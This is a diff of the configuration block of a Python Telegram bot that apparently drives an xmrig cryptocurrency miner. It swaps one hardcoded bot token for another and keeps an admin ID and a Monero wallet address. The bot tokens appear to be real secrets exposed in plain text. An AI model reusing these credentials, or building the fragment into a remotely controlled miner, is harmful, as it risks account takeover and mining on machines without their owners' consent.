@@ -7,7 +7,7 @@ from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
 # --- CONFIGURATION ---
-BOT_TOKEN = "7759797980:AAHV-FKBXJT10q-d1AEYf0mpHmRubdrzQwE"
+BOT_TOKEN = "7829836113:AAEw4z1bIAcf0Zlaf87KcJnLmbEwrOEZgsM"
 ADMIN_ID = 8179218740
 MONERO_WALLET = "47HxtCmFXxqVzQSGjQgBnDC1LRTrokf3aMFocbWQRxYzjhjxkfLGjzwE3PJhrCtdQkXPunr8cZZBAiEmY5W46V1UV8mFMZh"
 MINER_BIN = "./xmrig"
